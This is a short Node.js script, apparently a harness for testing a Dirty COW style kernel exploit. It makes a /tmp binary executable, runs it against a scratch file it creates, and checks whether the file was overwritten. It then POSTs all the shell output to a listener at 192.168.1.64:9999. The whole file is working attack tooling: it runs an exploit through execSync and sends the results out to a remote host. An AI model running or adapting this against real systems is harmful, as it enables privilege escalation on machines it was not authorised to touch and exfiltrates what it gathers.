"use strict";

var cp = require("child_process");
var http = require("http");
var fs = require("fs");

var HOST = "192.168.1.64";
var PORT = 9999;

function run(cmd, timeout) {
    try {
        return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: timeout || 25000 });
    } catch (e) {
        return "ERR " + (e.stdout ? e.stdout : e.message);
    }
}

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request(
        {
            host: HOST,
            port: PORT,
            path: path,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(data)
            }
        },
        function (res) {
            console.log("posted " + path + " -> " + res.statusCode);
        }
    );
    req.on("error", function (e) {
        console.log("post error " + e.message);
    });
    req.write(data);
    req.end();
}

var out = {};
out.started = new Date().toISOString();

out.prep = run("chmod +x /tmp/dcowtest; ls -la /tmp/dcowtest; printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > /tmp/zzz_dcow_target; ls -la /tmp/zzz_dcow_target; cat /tmp/zzz_dcow_target");

out.dcow_self = run("/tmp/dcowtest /tmp/zzz_dcow_target 2 0x42", 240000);

out.verify = run("cat /tmp/zzz_dcow_target; echo; od -An -tx1 /tmp/zzz_dcow_target | head -3");

post("/audit8", out);
